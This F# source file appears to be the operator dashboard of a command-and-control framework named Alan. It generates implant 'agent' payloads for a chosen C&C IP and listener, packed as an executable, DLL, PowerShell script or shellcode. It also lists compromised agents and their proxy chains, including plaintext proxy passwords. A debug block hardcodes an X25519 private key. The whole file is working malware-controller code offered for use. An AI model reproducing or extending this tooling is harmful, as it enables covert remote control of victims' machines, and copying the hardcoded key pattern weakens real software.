namespace ES.Alan.Server.Consoles

open System
open System.IO
open System.Reflection
open ES.Alan.Core
open ES.Fslog
open ES.Alan.Core.Entities
open ES.Alan.Core.Utility
open System.Text
open Microsoft.FSharp.Reflection
open ES.Alan.Server
open ES.Alan.Server.Consoles.ConsoleUtility
open System.Linq
open Org.BouncyCastle.Crypto.Generators
open Org.BouncyCastle.Security

type DashboardCliConsole(messageBroker: MessageBroker, networkUtility: NetworkUtility, logProvider: ILogProvider) as this =
    let mutable _type = ConsoleType.Dashboard

    let _logger =
        log "DashboardCliConsole"
        |> error "InvalidCommand" "Command '{0}' is not valid. Ignored"
        |> info "AgentFileCreate" "Agent file created at: {0}"
        |> error "AgentCreationError" "Unable to create the agent binary. {0}"
        |> warning "JoinError" "Unable to join agent {0}"      
        |> buildAndAdd(logProvider)

    let showProxies() =
        // get agents and proxies
        let proxiesMsg = new GetProxiesMessage()
        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
        let agentsMsg = new GetConnectedAgentsMessage()
        messageBroker.DispatchAndWaitHandling(this, agentsMsg)

        let table = new ConsoleTable([|"Id"; "Address"; "Port"; "Username"; "Password"; "Used by Agent Ids"; "Chained to"|])
        proxiesMsg.Proxies
        |> Seq.iter(fun proxy ->
            let usedBy = new StringBuilder()
            agentsMsg.Agents
            |> Seq.iter(fun agent -> 
                agent.Proxy
                |> Option.iter(fun agentProxy ->
                    if proxy.Id = agentProxy.Id then
                        usedBy.Append(agent.GetCleanId()).Append(Environment.NewLine) |> ignore
                )                
            )

            let chained =
                match proxy.Chain with
                | Some p -> p.Id.ToString()
                | None -> String.Empty

            table.AddRow(
                [|
                    proxy.Id
                    proxy.Address
                    proxy.Port
                    proxy.Username
                    proxy.Password
                    usedBy.ToString().Trim()
                    chained
                |])
        )

        writeLineText(table.ToString()) 

    let showProfiles() =
        let table = new ConsoleTable([|"Profile Name"|])
        let profilesPath = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "profiles")
        Directory.EnumerateFiles(profilesPath)
        |> Seq.iter(fun file ->
            let filename = Path.GetFileName(file)
            table.AddRow([|filename|])
        )
        writeLineText(table.ToString())  
                  
    let showAgents() =
        let table = new ConsoleTable([|"Id"; "Created"; "Last connected"; "Address"; "Version"; "Listener"; "Entrypoint"; "Arch"|])
        
        let msg = new GetConnectedAgentsMessage()
        messageBroker.DispatchAndWaitHandling(this, msg)
        msg.Agents
        |> Seq.iter(fun agent ->
            table.AddRow(
                [|
                    agent.GetCleanId()
                    agent.StartTime
                    agent.LastConnected
                    String.Format("{0}:{1}", agent.Address, agent.Port)
                    agent.Version
                    agent.ListenerType
                    agent.EntryPoint
                    (if agent.Bitness = CpuBitness.Bitness32 then "x86" else "x64")
                |])
        )
        writeLineText(table.ToString())     

    let createAgentFile
        (
            agentFileName: String,
            bindingIp: String, 
            bindingPort: Int32, 
            path: String, 
            profileFile: String, 
            bitness: CpuBitness, 
            artifactPackage: Packaging, 
            listenerType: ListenerType
        ) =

        // get the artifact type        
        let settings = ServerSettings.Read()

        // create agent PE file        
        let peBaseArtifactContent = 
            match artifactPackage with
            | Packaging.Vanilla
            | Packaging.Executable -> 
                match bitness with
                | CpuBitness.Bitness32 -> settings.AgentExeX86File
                | CpuBitness.Bitness64 -> settings.AgentExeX64File
            | _ -> 
                match bitness with
                | CpuBitness.Bitness32 -> settings.AgentDllX86File
                | CpuBitness.Bitness64 -> settings.AgentDllX64File
            |> File.ReadAllBytes

#if DEBUG
        // this is only for debugging purpose
        let publicKey = Convert.FromBase64String("glVuaZ30LXPYx8io9dwDfhHuGG0OKJXR5FEm7hpv9F4=")
        let privateKey = Convert.FromBase64String("2BSxb0NhF7+BgOIbehCUDCLTPgXt0440VIDG4us1Rl0=")
#else
        // generate public and private key
        let keyGenerator = new X25519KeyPairGenerator()
        keyGenerator.Init(new Org.BouncyCastle.Crypto.Parameters.X25519KeyGenerationParameters(new SecureRandom()))
        let keys = keyGenerator.GenerateKeyPair()    

        let publicKey = (keys.Public :?> Org.BouncyCastle.Crypto.Parameters.X25519PublicKeyParameters).GetEncoded()
        let privateKey = (keys.Private :?> Org.BouncyCastle.Crypto.Parameters.X25519PrivateKeyParameters).GetEncoded()
#endif        

        // customize profile        
        let agentSettings = AgentSettings.Read(File.ReadAllText(profileFile))
        agentSettings.PublicKey <- Convert.ToBase64String(publicKey)

        let serverSettings =
            match listenerType with
            | Http -> new System.Collections.Generic.List<AgentSettingsWebServer>(agentSettings.Servers.Http)
            | Https -> new System.Collections.Generic.List<AgentSettingsWebServer>(agentSettings.Servers.Https)

        // try to find the default server
        let isDefault(s: AgentSettingsWebServer) =
            s.Address.Trim().Equals("default", StringComparison.OrdinalIgnoreCase)

        let existingServerSettings =
            serverSettings 
            |> Seq.tryFind(isDefault)

        match existingServerSettings with
        | Some s ->
            s.Address <- bindingIp
            s.Port <- bindingPort
            s.Request.Path <- path
        | None ->
            serverSettings.Add(
                new AgentSettingsWebServer(
                    Address = bindingIp,
                    Port = bindingPort,
                    Request = new AgentSettingsHttpServerRequest(SessionCookie = "SSID", Path = path)
                )
            )

            // set again the web server settings
            match listenerType with
            | Http -> agentSettings.Servers.Http.AddRange(serverSettings)
            | Https -> agentSettings.Servers.Https.AddRange(serverSettings)

        // remove invalid settings
        [
            agentSettings.Servers.Http
            agentSettings.Servers.Https
        ]
        |> Seq.iter(fun settings ->
            settings
            |> Seq.toList
            |> List.filter(isDefault)
            |> List.map(settings.Remove)
            |> ignore
        )

        let agentInitialProfile = Encoding.UTF8.GetBytes(agentSettings.ToMinimalJson())

        // update the resource and create final artifact 
        try
            let configuredAgentContent = addConfigToAgentFile(peBaseArtifactContent, agentInitialProfile)
            let random = new Random()
            let agentId = random.Next() |> uint32
            let packer = new ArtifactPacker(settings.MapToPackerSettings())
            let finalArtifactContent = packer.PackPe(configuredAgentContent, artifactPackage)            
            File.WriteAllBytes(agentFileName, finalArtifactContent)
            _logger?AgentFileCreate(agentFileName)
            let message = 
                new NewAgentCreatedMessage(
                    agentId,
                    agentSettings, 
                    artifactPackage, 
                    publicKey, 
                    privateKey
                )
            messageBroker.Dispatch(this, message)
        with e ->
            _logger?AgentCreationError(e)

    let createAgent(profileName: String) =
        let profilesPath = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "profiles")
        
        Directory.EnumerateFiles(profilesPath)
        |> Seq.tryFind(fun file -> Path.GetFileName(file).StartsWith(profileName))
        |> function
            | Some profileFile ->
                writeLineText(String.Format("Creating agent from profile: {0}", Path.GetFileName(profileFile)))
                
                let packagingTypes = 
                    FSharpType.GetUnionCases(typeof<Packaging>)
                    |> Array.map(fun u -> u.Name)

                let listenerTypes =
                    FSharpType.GetUnionCases(typeof<ListenerType>)
                    |> Array.map(fun u -> u.Name)
                    
                // read properties                            
                let bindingIp = 
                    match networkUtility.GetPublicIP() with
                    | Some ip -> readWithDefault("Listener IP", ip)
                    | None -> read("C&C IP")
                            
                let path = readWithDefault("URL path", "/" + Utility.generateRandomString(2, 10))
                let artifactPackage = 
                    let value = readWithConstraints("Packaging", packagingTypes)            
                    match FSharpType.GetUnionCases typeof<Packaging> |> Array.filter (fun case -> case.Name.Equals(value, StringComparison.OrdinalIgnoreCase)) with
                    |[|case|] -> FSharpValue.MakeUnion(case,[||]) :?> Packaging
                    |_ -> failwith("Unknow packaging type: " + value)

                let fileName =                     
                    let extension = 
                        match artifactPackage with
                        | Packaging.DLL -> ".dll"
                        | Packaging.Vanilla
                        | Packaging.Executable -> ".exe"
                        | Packaging.PowerShell -> ".ps1"
                        | Packaging.Shellcode -> ".bin"                        
                    let baseName = Utility.generateRandomString(4,8) + extension                    
                    readWithDefault("Agent file", Path.Combine(Path.GetTempPath(), baseName))
                                        
                let bitness = 
                    readWithConstraints("Bitness", [|"x86"; "x64"|])
                    |> CpuBitness.FromString
                    
                let listenerType =
                    let value = readWithConstraints("Listener", listenerTypes)            
                    match FSharpType.GetUnionCases typeof<ListenerType> |> Array.filter (fun case -> case.Name.Equals(value, StringComparison.OrdinalIgnoreCase)) with
                    |[|case|] -> FSharpValue.MakeUnion(case,[||]) :?> ListenerType
                    |_ -> failwith("Unknow listener type: " + value)
                                            
                let defaultPort =
                    let msg = new GetEndpointsMessage()
                    messageBroker.DispatchAndWaitHandling(this, msg)
                    msg.Endpoints
                    |> Seq.tryFind(fun listenerInfo ->
                        listenerInfo.Type = listenerType
                    )
                    |> function
                        | Some listener -> listener.BindingPort.ToString()
                        | None -> String.Empty            
                let bindingPort = Int32.Parse(ConsoleUtility.readWithDefault("Binding Port", defaultPort))
                    
                // finally create the agent file
                createAgentFile(
                    fileName,
                    bindingIp, 
                    bindingPort, 
                    path, 
                    profileFile, 
                    bitness,
                    artifactPackage,             
                    listenerType
                )
            | None -> 
                writeLineText(String.Format("Profile file '{0}' not found", profileName))        

#if DEBUG
    do
        // create an agent for testing purpose
        if not DashboardCliConsole.TestAgentCreated then
            DashboardCliConsole.TestAgentCreated <- true
            let profilesPath = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "profiles")
            let profileFile = Path.Combine(profilesPath, "agent_default_profile.json")
            let agentSettings = AgentSettings.Read(File.ReadAllText(profileFile))
            let (s, t) =
                if agentSettings.Servers.Http.Count > 0 then
                    (agentSettings.Servers.Http.[0], ListenerType.Http)
                else
                    (agentSettings.Servers.Https.[0], ListenerType.Https)                    
            createAgentFile("debugAgent.exe", "127.0.0.1", s.Port, s.Request.Path, profileFile, CpuBitness.Bitness32, Packaging.Executable, t)
            |> ignore
    static member val TestAgentCreated = false with get, set
#endif

    abstract GetHelp: unit -> String
    default this.GetHelp() = 
        """
[+] Help:
        ? or help                   Show this help
        profiles                    Show the available profiles that can be used to configure the agent
        create [<profile filename>] Create a new agent binary using the specified profile file
        agents                      List the currently active agents
        proxy                       List the currently configured proxies for each agent
        join <agent ID>             Select the specified agent as the currently active one        
        exit                        Terminate the server process
        """

    abstract PrintCursor: unit -> unit
    default this.PrintCursor() =   
        let savedPalette = Console.ForegroundColor
        Console.ForegroundColor <- ConsoleColor.DarkGray
        writeText("$:> ")
        Console.ForegroundColor <- savedPalette    

    abstract ProcessCommand: String * String array -> ConsoleType
    default this.ProcessCommand(command: String, args: String array) =
        if command.Equals("agents") then
            showAgents()
            this.Type
        elif command.Equals("proxy") && args.Length = 0 then
            showProxies()
            this.Type
        elif command.Equals("?") || command.Equals("help") then
            writeLineText(this.GetHelp())
            this.Type
        elif command.Equals("profiles") then
            showProfiles()
            this.Type
        elif command.Equals("exit") then
            writeLineText("Exiting...")
            ConsoleType.NoConsole
        elif command.Equals("create") then
            try 
                if args.Length > 0 then createAgent(args.[0])
                else createAgent("agent_default_profile")
            with e -> _logger?AgentCreationError(e)
            this.Type
        elif command.Equals("join") then
            let msg = new GetConnectedAgentsMessage()
            messageBroker.DispatchAndWaitHandling(this, msg)
            msg.Agents
            |> Seq.tryFind(fun agent -> 
                args.Length = 0 ||
                agent.GetCleanId().StartsWith(args.[0], StringComparison.OrdinalIgnoreCase)
            )
            |> function
                | Some agent -> 
                    ConsoleType.Agent(agent.Id)
                | None -> 
                    let msg = if args.Length = 0 then String.Empty else args.[0]
                    _logger?JoinError(msg)
                    this.Type            
        elif not <| String.IsNullOrWhiteSpace(command) then
            _logger?InvalidCommand(command)
            this.Type        
        else
            this.Type    

    abstract CommandCompleted: Int32 -> ConsoleType
    default this.CommandCompleted(commandId: Int32) =
        writeLineText()
        this.PrintCursor()
        this.Type

    abstract Type: ConsoleType with get, set
    default this.Type 
        with get() = _type
        and set(v) = _type <- v

    interface ICliConsole with
        member this.ProcessCommand(command: String, args: String array) =
            this.ProcessCommand(command, args)

        member this.CommandCompleted(commandId: Int32) =
            this.CommandCompleted(commandId)

        member this.GetHelp() =
            this.GetHelp()

        member this.PrintCursor() =
            this.PrintCursor()

        member this.Type 
            with get() = this.Type
            and set(v) = this.Type <- v